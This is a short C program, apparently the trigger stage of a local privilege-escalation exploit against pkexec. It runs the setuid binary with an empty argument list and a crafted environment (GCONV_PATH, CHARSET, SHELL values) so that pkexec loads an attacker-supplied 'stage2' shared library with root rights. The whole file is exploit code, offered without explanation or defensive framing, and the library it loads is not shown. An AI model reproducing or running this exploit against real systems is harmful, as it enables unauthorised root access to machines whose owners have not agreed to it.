#include <unistd.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    char * const args[] = {NULL};
    char *env[] = {"stage2.so:.", "PATH=GCONV_PATH=.", "CHARSET=STAGE2", "SHELL=stage2", NULL};
    return execve("/usr/bin/pkexec", args, env);
}